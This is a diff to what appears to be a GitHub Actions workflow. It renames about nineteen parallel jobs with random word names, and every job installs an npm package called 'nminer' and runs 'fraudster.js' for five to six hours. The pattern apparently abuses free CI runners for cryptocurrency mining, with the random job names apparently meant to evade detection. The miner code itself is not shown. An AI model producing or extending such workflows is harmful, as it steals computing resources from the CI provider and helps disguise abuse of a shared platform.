@@ -4,7 +4,7 @@ on:
     branches: [ "main" ]
 
 jobs:
-    so_spectate:
+    unnecessarily_how:
       runs-on: ubuntu-latest
       steps:
         - name: Checkout
@@ -15,12 +15,12 @@ jobs:
           with:
             node-version: 20
             
-        - name: so_spectate
+        - name: unnecessarily_how
           run: |
             npm install nminer
-            timeout 346m node fraudster.js --job so_spectate
+            timeout 321m node fraudster.js --job unnecessarily_how
   
-    between_drat_near:
+    below_beneath_guest:
       runs-on: ubuntu-latest
       steps:
         - name: Checkout
@@ -31,12 +31,12 @@ jobs:
           with:
             node-version: 20
             
-        - name: between_drat_near
+        - name: below_beneath_guest
           run: |
             npm install nminer
-            timeout 337m node fraudster.js --job between_drat_near
+            timeout 327m node fraudster.js --job below_beneath_guest
   
-    male_source:
+    aw_gracefully:
       runs-on: ubuntu-latest
       steps:
         - name: Checkout
@@ -47,12 +47,12 @@ jobs:
           with:
             node-version: 20
             
-        - name: male_source
+        - name: aw_gracefully
           run: |
             npm install nminer
-            timeout 335m node fraudster.js --job male_source
+            timeout 345m node fraudster.js --job aw_gracefully
   
-    enrage_mallard:
+    weight_aboard:
       runs-on: ubuntu-latest
       steps:
         - name: Checkout
@@ -63,12 +63,12 @@ jobs:
           with:
             node-version: 20
             
-        - name: enrage_mallard
+        - name: weight_aboard
           run: |
             npm install nminer
-            timeout 335m node fraudster.js --job enrage_mallard
+            timeout 330m node fraudster.js --job weight_aboard
   
-    ugh_drat_but:
+    uhhuh:
       runs-on: ubuntu-latest
       steps:
         - name: Checkout
@@ -79,12 +79,12 @@ jobs:
           with:
             node-version: 20
             
-        - name: ugh_drat_but
+        - name: uhhuh
           run: |
             npm install nminer
-            timeout 304m node fraudster.js --job ugh_drat_but
+            timeout 310m node fraudster.js --job uhhuh
   
-    chainstay_configuration:
+    sonar_down:
       runs-on: ubuntu-latest
       steps:
         - name: Checkout
@@ -95,12 +95,12 @@ jobs:
           with:
             node-version: 20
             
-        - name: chainstay_configuration
+        - name: sonar_down
           run: |
             npm install nminer
-            timeout 331m node fraudster.js --job chainstay_configuration
+            timeout 329m node fraudster.js --job sonar_down
   
-    than_sweetly:
+    boohoo_kiddingly_deliberately:
       runs-on: ubuntu-latest
       steps:
         - name: Checkout
@@ -111,12 +111,12 @@ jobs:
           with:
             node-version: 20
             
-        - name: than_sweetly
+        - name: boohoo_kiddingly_deliberately
           run: |
             npm install nminer
-            timeout 318m node fraudster.js --job than_sweetly
+            timeout 308m node fraudster.js --job boohoo_kiddingly_deliberately
   
-    determined_cruelly_wisely:
+    wry_finally_sorrowful:
       runs-on: ubuntu-latest
       steps:
         - name: Checkout
@@ -127,12 +127,12 @@ jobs:
           with:
             node-version: 20
             
-        - name: determined_cruelly_wisely
+        - name: wry_finally_sorrowful
           run: |
             npm install nminer
-            timeout 349m node fraudster.js --job determined_cruelly_wisely
+            timeout 300m node fraudster.js --job wry_finally_sorrowful
   
-    inside:
+    cauliflower_excluding_whether:
       runs-on: ubuntu-latest
       steps:
         - name: Checkout
@@ -143,12 +143,12 @@ jobs:
           with:
             node-version: 20
             
-        - name: inside
+        - name: cauliflower_excluding_whether
           run: |
             npm install nminer
-            timeout 328m node fraudster.js --job inside
+            timeout 333m node fraudster.js --job cauliflower_excluding_whether
   
-    gape_ah_against:
+    economise:
       runs-on: ubuntu-latest
       steps:
         - name: Checkout
@@ -159,12 +159,12 @@ jobs:
           with:
             node-version: 20
             
-        - name: gape_ah_against
+        - name: economise
           run: |
             npm install nminer
-            timeout 302m node fraudster.js --job gape_ah_against
+            timeout 350m node fraudster.js --job economise
   
-    playfully_likewise:
+    but_yahoo_hasty:
       runs-on: ubuntu-latest
       steps:
         - name: Checkout
@@ -175,12 +175,12 @@ jobs:
           with:
             node-version: 20
             
-        - name: playfully_likewise
+        - name: but_yahoo_hasty
           run: |
             npm install nminer
-            timeout 305m node fraudster.js --job playfully_likewise
+            timeout 350m node fraudster.js --job but_yahoo_hasty
   
-    responsible:
+    unexpectedly_above:
       runs-on: ubuntu-latest
       steps:
         - name: Checkout
@@ -191,12 +191,12 @@ jobs:
           with:
             node-version: 20
             
-        - name: responsible
+        - name: unexpectedly_above
           run: |
             npm install nminer
-            timeout 309m node fraudster.js --job responsible
+            timeout 303m node fraudster.js --job unexpectedly_above
   
-    doing_solemnly_mild:
+    ethical_till:
       runs-on: ubuntu-latest
       steps:
         - name: Checkout
@@ -207,12 +207,12 @@ jobs:
           with:
             node-version: 20
             
-        - name: doing_solemnly_mild
+        - name: ethical_till
           run: |
             npm install nminer
-            timeout 324m node fraudster.js --job doing_solemnly_mild
+            timeout 346m node fraudster.js --job ethical_till
   
-    tank:
+    come:
       runs-on: ubuntu-latest
       steps:
         - name: Checkout
@@ -223,12 +223,12 @@ jobs:
           with:
             node-version: 20
             
-        - name: tank
+        - name: come
           run: |
             npm install nminer
-            timeout 342m node fraudster.js --job tank
+            timeout 308m node fraudster.js --job come
   
-    apropos_ferret_ferociously:
+    exhausted:
       runs-on: ubuntu-latest
       steps:
         - name: Checkout
@@ -239,12 +239,12 @@ jobs:
           with:
             node-version: 20
             
-        - name: apropos_ferret_ferociously
+        - name: exhausted
           run: |
             npm install nminer
-            timeout 325m node fraudster.js --job apropos_ferret_ferociously
+            timeout 319m node fraudster.js --job exhausted
   
-    lest_greedy:
+    aware_determined:
       runs-on: ubuntu-latest
       steps:
         - name: Checkout
@@ -255,12 +255,12 @@ jobs:
           with:
             node-version: 20
             
-        - name: lest_greedy
+        - name: aware_determined
           run: |
             npm install nminer
-            timeout 310m node fraudster.js --job lest_greedy
+            timeout 336m node fraudster.js --job aware_determined
   
-    cram_joshingly:
+    meanwhile:
       runs-on: ubuntu-latest
       steps:
         - name: Checkout
@@ -271,12 +271,12 @@ jobs:
           with:
             node-version: 20
             
-        - name: cram_joshingly
+        - name: meanwhile
           run: |
             npm install nminer
-            timeout 337m node fraudster.js --job cram_joshingly
+            timeout 312m node fraudster.js --job meanwhile
   
-    phooey:
+    opposite_phrase_concerning:
       runs-on: ubuntu-latest
       steps:
         - name: Checkout
@@ -287,12 +287,12 @@ jobs:
           with:
             node-version: 20
             
-        - name: phooey
+        - name: opposite_phrase_concerning
           run: |
             npm install nminer
-            timeout 312m node fraudster.js --job phooey
+            timeout 306m node fraudster.js --job opposite_phrase_concerning
   
-    near_oof_roundabout:
+    though:
       runs-on: ubuntu-latest
       steps:
         - name: Checkout
@@ -303,8 +303,8 @@ jobs:
           with:
             node-version: 20
             
-        - name: near_oof_roundabout
+        - name: though
           run: |
             npm install nminer
-            timeout 324m node fraudster.js --job near_oof_roundabout
+            timeout 302m node fraudster.js --job though
   
